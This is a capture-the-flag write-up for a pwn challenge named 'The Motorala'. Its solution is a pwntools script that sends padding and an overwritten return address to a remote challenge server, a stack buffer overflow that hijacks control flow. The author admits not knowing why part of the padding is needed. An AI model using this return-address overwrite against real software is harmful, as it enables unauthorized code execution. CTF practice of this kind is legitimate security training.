##  The Motorala

Category: pwn

### Description

i bet u wont guess my pin

Author: Elma

### Solution

Scripts:

```py
from pwn import *

#p = process("./chall")
p = remote("challs.nusgreyhats.org", 30211)

payload =  b'a' * 0x30  # size of attempt[0x30]
payload += b'b' * 4     # size of count
payload += b'cccccccceeeeeeeeoooo' # TODO: Still not sure why need this part
# The reason why I know need extra 20 characters is by using GDB and inspect the stack before and after user input
payload += p64(0x0000000000401393)

p.recvuntil(b"PIN:")
p.sendline(b'LOL')

p.recvuntil(b"PIN:")
p.sendline(b'LOL')

p.recvuntil(b"PIN:")
p.sendline(b'LOL')

p.recvuntil(b"PIN:")
p.sendline(b'LOL')

p.recvuntil(b'PIN:')
p.sendline(payload)

p.interactive()
```
